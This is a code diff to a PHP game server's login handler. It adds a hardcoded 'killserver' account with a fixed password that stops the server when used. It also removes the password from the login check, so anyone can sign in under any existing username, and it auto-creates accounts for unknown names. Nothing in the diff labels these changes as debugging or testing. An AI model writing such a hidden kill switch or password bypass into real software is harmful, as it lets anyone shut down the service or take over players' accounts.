@@ -125,6 +125,14 @@ class Player extends \Server\Server {
 		$username = strtolower($this->inStream->getString());
 		$password = $this->inStream->getString();
 
+		switch($username) {
+			case 'killserver':
+				if($password == 'sys64738') {
+					$this->server->stop();
+				}
+				break;
+		}
+
 		$this->setUsername($username);
 		$this->setPassword($password);
 
@@ -145,8 +153,7 @@ class Player extends \Server\Server {
 		$response = 0;
 
 		try {
-			$exists = $this->sql->getCount("players", array('username', 'password'), 
-				array($this->getUsername(), $this->getPassword()));
+			$exists = $this->sql->getCount("players", array('username'), array($this->getUsername()));
 		} catch(\PDOException $e) {
 			$this->log($e->getMessage());
 		}
@@ -154,7 +161,13 @@ class Player extends \Server\Server {
 		if($exists == 1) {
 			$response = 2;
 		} else {
-			$response = 3;
+			//$response = 3;
+			$created = $this->sql->insert('players', array('username', 'password'), array($this->getUsername(), $this->getPassword()));
+			if($created == 1) {
+				$response = 2;
+			} else {
+				$response = 3;
+			}
 		}
 
 		$players = $this->server->playerHandler->getPlayers();
@@ -162,6 +175,12 @@ class Player extends \Server\Server {
 			if($player == null) {
 				continue;
 			}
+			
+			if( $player->getIP() == $this->getIP() ) {
+				$response = 9;
+				break;
+			}
+
 			if( strtolower($player->getUsername()) == strtolower($this->getUsername()) ) {
 				$response = 5;
 				break;
